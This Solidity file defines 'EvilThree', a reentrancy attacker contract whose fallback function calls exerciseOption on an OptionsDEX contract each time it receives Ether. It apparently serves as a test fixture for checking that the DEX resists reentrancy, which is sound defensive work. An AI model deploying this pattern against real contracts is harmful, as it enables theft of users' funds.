pragma solidity 0.8.0;

import "../interfaces/IERC20.sol";
import "../interfaces/IOptionsDEX.sol";

contract EvilThree {

    // ERC20 contract
    IERC20 immutable token;
    // OptionsDEX contract
    IOptionsDEX immutable optionsContract;
    // Option hash
    bytes32 private hash;

    constructor(address payable _optionsDEX, address _token) {
        token = IERC20(_token);
        optionsContract = IOptionsDEX(_optionsDEX);
    }

    function setup(bytes32 _hash) public {
        hash = _hash;
    }

    fallback() external payable {
        // Call exerciseOption
        optionsContract.exerciseOption(hash);
    }

}